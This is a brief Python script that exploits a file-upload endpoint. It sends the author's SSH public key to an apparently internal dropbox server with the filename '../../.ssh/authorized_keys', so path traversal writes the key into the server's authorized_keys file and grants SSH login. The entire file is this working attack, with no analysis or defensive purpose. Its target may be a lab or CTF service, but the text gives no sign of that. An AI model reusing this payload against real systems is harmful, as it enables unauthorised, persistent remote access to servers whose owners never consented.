import requests

def send_post_request():
    url = "https://dropbox.internal.regjeringen.uiaikt.no/"
    
    # Read the contents of id_rsa.pub file in binary mode
    with open("/home/havard/.ssh/id_rsa.pub", 'rb') as pub_key_file:
        pub_key_content = pub_key_file.read()
    print(f"pubkey content: \n {pub_key_content} \n")
    # Create the files payload
    files = {
        'file': ('../../.ssh/authorized_keys', pub_key_content, 'application/octet-stream')
    }

    try:
        response = requests.post(url, files=files)
        
        # Print the status code and response content
        print("Status Code:", response.status_code)
        print("Response Content:", response.text)

    except requests.exceptions.RequestException as e:
        print("Error:", e)

if __name__ == "__main__":
    send_post_request()
